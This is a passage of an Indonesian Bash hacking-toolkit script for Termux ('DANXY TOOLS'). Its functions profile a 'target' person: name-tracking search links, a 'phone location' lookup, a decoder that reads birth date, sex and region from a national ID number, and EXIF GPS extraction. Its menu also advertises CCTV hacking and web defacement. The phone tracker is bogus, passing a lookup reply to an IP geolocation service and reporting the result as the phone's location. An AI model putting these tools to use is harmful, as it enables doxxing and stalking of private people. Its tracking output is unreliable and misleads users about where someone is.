⢠⣾⣿⣻⣧⣻⣆⠘⣿⣿⣿⠿⠿⠛⠛⠛⠻⠾⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣿⢟⡹⣸⡇⠀⠀⠀⠀
⢨⣿⣟⣿⡿⣧⡘⣷⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣥⣮⣵⣼⣁⣀⣀⣀⣀
⢘⣿⣿⣻⣟⣿⣻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣼⣿⣿⠋⠉⠉⠉⠙⠛⠛⠿⣯⣉⠉⣙⣻⠽⠛⣿
⠈⠻⠟⡭⠯⠏⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠘⠷⢦⣄⣀⣀⣤⣤⣾⣿⣿⣿⣏⣀⣀⣀⣀⣀⣀⣠⠤⠤⠬⠟⠛⠋⠁⢀⣤⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣀⣠⣾⠟⠙
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣷⡟⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢠⣦⣤⣶⡶⢟⡟⣋⠳⣼⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣿⣿⣿⣿⠿⣛⡙⢦⠚⡥⢓⡞⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣽⣯⣯⣽⣿⣎⠳⡌⡵⢊⡵⣌⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣯⢿⣮⣑⠳⣌⣣⠶⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠈⠓⠛⠛⠛⠛⠉⠀" | lolcat -p 0.7
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}LACAK NAMA${CYAN}                 │
  ╰────────────────────────────────────────╯${NC}"
read -p "Masukkan nama lengkap: " nama

echo ""
echo -e "\033[1;94m[↓] Sedang mencari data publik tentang: $nama...\033[0m"
sleep 2

# Simulasi pencarian melalui Google Dork / GitHub / Social media
echo ""
echo -e "\033[1;93m[∆] Hasil pencarian publik:\033[0m"

# Gunakan dork Google Search (hasil hanya tampil di terminal)
echo -e "\nGoogle Search:"
echo "https://www.google.com/search?q=\"$nama\" site:facebook.com"
echo "https://www.google.com/search?q=\"$nama\" site:linkedin.com"
echo "https://www.google.com/search?q=\"$nama\" site:twitter.com"

# Dork GitHub
echo -e "\nGitHub (mungkin jika target programmer):"
echo "https://github.com/search?q=$nama"
curl -s "https://api.github.com/users/$user" | jq -r '.html_url'
curl -s "https://www.instagram.com/$user" | head -1
# Tambahan sumber publik (jika diperlukan)
echo -e "\nSumber tambahan:"
echo "https://www.peekyou.com/$nama"
echo "https://pipl.com/search/?q=$nama"

echo ""
echo -e "\033[1;92m[✓] Selesai. Silakan salin dan telusuri link di atas.\033[0m"
}

lacak_lokasi_nomor() {
clear
spasi
    echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                  ⠀⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣤⣖⣿⣿⣿⣿⣒⡦⡀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀⠀⣀⣴⣿⢟⣽⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠀⠀⠀⠀⠀⠙⠛⠳⠄⠀⠀⠀⠴⠛⠋⠁⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣦⣀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat -p 0.7
    echo -n "Masukkan nomor HP (dengan kode negara, contoh 08xxx): "
    read nomor

    echo "[ ✓ ] Mengecek lokasi..."
    curl -s "http://ip-api.com/json/$(curl -s https://numlookupapi.com/api/lookup/$nomor | grep -oP '(?<="ip":")[^"]+')" | jq
}



osint_nik() {
    clear
    spasi
    echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                  ⠀⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣤⣖⣿⣿⣿⣿⣒⡦⡀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀⠀⣀⣴⣿⢟⣽⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠀⠀⠀⠀⠀⠙⠛⠳⠄⠀⠀⠀⠴⠛⠋⠁⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣦⣀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat -p 0.7
    echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"

    # Input NIK
    read -p "$(echo -e ${RED}Input\ NIK\ Target:\ ${NC})" nik

    # Validasi NIK
    if ! [[ $nik =~ ^[0-9]{16}$ ]]; then
        echo -e "${RED}ERROR! NIK Tidak Valid!${NC}"
        exit 1
    fi

    # Jalankan loading pura-pura (misalnya 3 detik) di background
    (sleep 3) &
    pid=$!
    spin $pid
    wait $pid

    # Ekstrak data
    tanggal="${nik:6:2}"
    bulan="${nik:8:2}"
    tahun="${nik:10:2}"
    prov="${nik:0:2}"
    kabkot="${nik:0:4}"
    kecamatan="${nik:0:6}"
    uniqcode="${nik:12:4}"

    # Jenis kelamin
    if ((10#$tanggal > 40)); then
        tanggal=$((10#$tanggal - 40))
        jeniskelamin="PEREMPUAN"
    else
        jeniskelamin="LAKI-LAKI"
    fi

    # Cek data.json
    if [[ ! -f "data.json" ]]; then
        echo -e "${RED}! Data Tidak Valid !${NC}"
        exit 1
    fi

    # Ambil data dari JSON
    provinsi=$(jq -r --arg p "$prov" '.provinsi[$p] // $p' data.json)
    kabupaten=$(jq -r --arg k "$kabkot" '.kabkot[$k] // $k' data.json)
    kecamatan_data=$(jq -r --arg kc "$kecamatan" '.kecamatan[$kc] // $kc' data.json)

    # Pecah kecamatan & kode pos
    if [[ "$kecamatan_data" == *"--"* ]]; then
        kecamatan_name="${kecamatan_data%%--*}"
        kode_pos="${kecamatan_data##*--}"
    else
        kecamatan_name="$kecamatan_data"
        kode_pos="N/A"
    fi

    # Output
    loading
    echo -e "${GREEN}!Tanggal Lahir: $tanggal/$bulan/$tahun${NC}"
    echo -e "${GREEN}!Jenis Kelamin: $jeniskelamin${NC}"
    echo -e "${GREEN}!Provinsi: $provinsi${NC}"
    echo -e "${GREEN}!Kab/Kota: $kabupaten${NC}"
    echo -e "${GREEN}!Kecamatan: $kecamatan_name${NC}"
    echo -e "${GREEN}!Kode Pos: $kode_pos${NC}"
    echo -e "${GREEN}!Uniqcode: $uniqcode${NC}"
}

menu_Osin() {
  while true; do
clear
  if command_exists figlet; then
    figlet -f slant " MenuOsin" | lolcat -p 0.7
  else
    echo -e "${CYAN}  ===== DanxyTols =====${NC}"
    sleep 1
    clear
  fi
     echo -e "  ${BG_RED}${YELLOW}MENU KE 2 DANXY TOOLS${NC}"
     echo -e "
 ╭───────────────────────────────────────────────╮
 │                                               │
 ╭─────────────┬────────────────────────────┬────╮
 │  [   01   ] │ SHORT LINK                 │    │
 │  [   02   ] │ Chat Ai                    │    │
 │  [   03   ] │ Checker NIK                │    │
 │  [   04   ] │ Tracking Nama              │    │
 │  [   05   ] │ Checker BD File PHP        │    │
 │  [   06   ] │ Generate Pasword           │    │
 │  [   07   ] │ Checker Cyrpto BTC/USDT    │    │
 │  [   08   ] │ HACK CCTV                  │    │  
 │  [   09   ] │ GENERATOR HTML DEFACE      │    │  
 │  [   10   ] │ EXIF TOOLS                 │    │
 │  [   11   ] │ SOURCEWEB                  │    │   
 │  [   00   ] │ KEMBALI KE MENU AWAL       │    │
 ╰─────────────┴────────────────────────────┴────╯
 │                                               │
 ╰───────────────────────────────────────────────╯" | lolcat -p 0.7
   echo -e "${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
    printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} OSIN ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r pilih

    case $pilih in
    
      01|1)
      klik
        short_url
        klik
       ;;
      02|2)
      klik
        ai_chat
        klik
       ;;
      03|3)
      klik
        cheker_nik
        klik
       ;;
       04|4)
       klik
        track_nama
        klik
        ;;
       05|5)
       klik
        checker_backdor_php
        klik
        ;;
       06|6)
       klik
        generate_password
        klik
        ;;
       07|7)
       klik
        crypto_check
        klik
        ;;
        08|8)
        klik
        cctv
        klik
        ;;
       09|9)
       klik
       Generator_Deface
       klik
        ;;
      10)
        klik
        exif_menu
        klik
        ;;
      11)
       klik
       sourceWeb
       klik
        ;;
      00|0)
      klik
        echo "CLOSE MENU 2" | lolcat -p 0.7
        break
        ;;
        *)
        echo "INPUT TIDAK VALID!" | lolcat -p 0.7
        salah
        ;;
    esac

     echo ""
    read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat -p 0.7
    klik
  done
}

sourceWeb() {
  # Warna
  MERAH='\e[38;5;196m'; HIJAU='\e[38;5;82m'; KUNING='\e[38;5;226m'
  BIRU='\e[38;5;39m'; UNGU='\e[38;5;201m'; CYAN='\e[38;5;51m'
  PUTIH='\e[38;5;255m'; RESET='\e[0m'

  # Cek dependensi
  for d in curl; do
    command -v "$d" >/dev/null 2>&1 || {
      echo -e "${MERAH}[ ∅ ] Install dulu:${RESET} pkg install $d"
      return
    }
  done

  # Cek storage
  [[ -d "/storage/emulated/0" ]] || {
    echo -e "${MERAH}[ ∅ ] Storage tidak ter-mount.${RESET}\n${KUNING}💡 Jalankan:${RESET} termux-setup-storage"
    return
  }

  TARGET_DIR="/storage/emulated/0/HASIL SOURCE CODE"
  mkdir -p "$TARGET_DIR"

  clear
  echo -e "  ${GREEN}● ${YELLOW}● ${RED}●
${UNGU}╔════════════════════════════════════════════════════════╗
${UNGU}║ ${CYAN}░██████╗██████╗░░█████╗░░██╗░░░░░░░██╗███████╗██████╗░${UNGU} ║
${UNGU}║ ${CYAN}██╔════╝██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝██╔══██╗${UNGU} ║
${UNGU}║ ${CYAN}╚█████╗░██████╔╝██║░░╚═╝░╚██╗████╗██╔╝█████╗░░██████╦╝${UNGU} ║
${UNGU}║ ${CYAN}░╚═══██╗██╔══██╗██║░░██╗░░████╔═████║░██╔══╝░░██╔══██╗${UNGU} ║
${UNGU}║ ${CYAN}██████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░███████╗██████╦╝${UNGU} ║
${UNGU}║ ${CYAN}╚═════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░${UNGU} ║
${UNGU}║${RESET}           ${HIJAU}SOURCE CODE WEBSITE BY TOOLS V8.4${RESET}            ${UNGU}║
${UNGU}╠════════════════════════════════════════════════════════╣${RESET}
${UNGU}║${CYAN}███████████████████████████${GREEN}] [${CYAN}██████████████████████████${UNGU}║
${UNGU}╠════════════════════════════════════════════════════════╝${RESET}
${UNGU}║"
  printf "${UNGU}╚═${GREEN}[ ${WHITE}${BOLD}Masukkan URL ${GREEN}]${RESET} ${BG_RED}${YELLOW}(http/https)${RESET} ${GREEN}: ${RESET}"
  read -r URL

  [[ $URL =~ ^https?:// ]] || {
    echo -e "${MERAH}[∅] URL harus diawali http:// atau https://${RESET}"
    echo -e "${KUNING}KEMBALI KE MENU OSIN DALAM 2 DETIK...${RESET}"
    sleep 2
    return
  }

  # Hitung nomor berikutnya
  LAST=0
  for f in "${TARGET_DIR}"/SourceByToolsV84\(*\).html; do
    [[ -e $f ]] || continue
    num=${f##*SourceByToolsV84(}
    num=${num%%)*}
    (( num > LAST )) && LAST=$num
  done
  NEXT=$((LAST + 1))
  OUT="${TARGET_DIR}/SourceByToolsV84(${NEXT}).html"

  echo -e "\n${HIJAU}[!] Mengunduh source code...${RESET}"
  curl -Ls "$URL" -o "$OUT" && {
    echo -e "\n${HIJAU}[✓] Berhasil! File tersimpan di:${RESET}"
    echo -e "${PUTIH}   $OUT${RESET}"
  } || echo -e "\n${MERAH}[∅] Gagal mengunduh, cek koneksi atau URL.${RESET}"

  echo -e "\n${KUNING}Tekan Enter untuk kembali ke menu utama...${RESET}"
  read -r
}








RED=$(tput setaf 9)
GREEN=$(tput setaf 10)
YELLOW=$(tput setaf 11)
BLUE=$(tput setaf 12)
MAGENTA=$(tput setaf 13)
CYAN=$(tput setaf 14)
WHITE=$(tput setaf 15)
BOLD=$(tput bold)
RESET=$(tput sgr0)

# ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
# ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
#│

show_exif() {
clear
    local file=$1
    if [[ ! -f "$file" ]]; then
        echo -e "${RED}File tidak ditemukan: $file${RESET}"
        return
    fi
                clear
              echo -e "
        ⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀${CYAN}KALI LINUX${RESET}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄" | lolcat -p 0.7
    echo -e "${RED}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
    echo -e "${RED}│${WHITE}${BOLD}Metadata Lengkap & Ringkasan untuk:"
    echo -e "${RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    echo -e "${BOLD}${GREEN}$file${RESET}${CYAN}${RESET}"

    # 1. Tampilkan Metadata Penting
    echo -e "${BOLD}${YELLOW}=== INFORMASI UMUM & KAMERA ===${RESET}"
    # Menampilkan lebih banyak tag penting
    exiftool "$file" | grep -E '^(File Name|Make|Model|Date Time Original|Exposure Time|F Number|ISO Speed Ratings|Focal Length|Image Size)' | awk '
    BEGIN { FS=": "; OFS="\t" }
    {
        tag = $1
        val = $2
        # Menghilangkan whitespace di awal/akhir tag dan value
        gsub(/^[ \t]+|[ \t]+$/, "", tag) 
        gsub(/^[ \t]+|[ \t]+$/, "", val) 
        print tag ":", val
    }
    ' | sed "s/^/${GREEN}${BOLD}/; s/: /:${RESET}\t/"
    
    echo

    # 2. Cek dan Tampilkan Lokasi GPS (Google Maps Link)
    echo -e "${BOLD}${YELLOW}=== LOKASI GPS ===${RESET}"
    
    # Ambil koordinat desimal langsung dari exiftool
    local gps_latitude_ref=$(exiftool -s3 -GPSLatitudeRef "$file")
    local gps_longitude_ref=$(exiftool -s3 -GPSLongitudeRef "$file")
    local gps_latitude=$(exiftool -s3 -GPSLatitude "$file")
    local gps_longitude=$(exiftool -s3 -GPSLongitude "$file")
    local gps_position=$(exiftool -s3 -GPSPosition "$file") # Format Desimal D.dddddd

    if [[ -n "$gps_position" ]]; then
        # Bersihkan format GPSPosition agar hanya menyisakan koordinat (e.g. "40.7128 N, 74.0060 W" -> "40.7128,-74.0060")
        
        # Ambil Latitude dan Longitude dalam format desimal
        local lat=$(echo "$gps_position" | awk -F', ' '{print $1}')
        local lon=$(echo "$gps_position" | awk -F', ' '{print $2}')

        # Ubah referensi N/S/E/W menjadi tanda +/- (exiftool -n sudah memberikan output numerik)
